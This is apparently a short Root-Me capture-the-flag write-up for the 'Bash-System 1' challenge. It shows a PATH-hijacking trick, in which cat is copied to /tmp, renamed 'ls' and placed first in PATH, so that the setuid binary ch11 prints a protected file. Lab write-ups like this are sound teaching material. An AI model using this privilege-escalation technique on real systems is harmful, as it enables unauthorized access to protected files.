---
title: Bash-System 1
layout: post 
date:   2022-04-26 09:08:06
permalink: /:categories/:title
categories: writeups root-me.scripting
---

We need to copy cat into /tmp, then change the name to "ls" and change the path to that folder.
Now the script will read it as cat.
```bash
> mkdir /tmp/isntma
> cp /bin/cat /tmp/isntma
> mv /tmp/isntma/cat /tmp/isntma/ls
> export PATH=/tmp/isntma:$PATH
> ./ch11
```
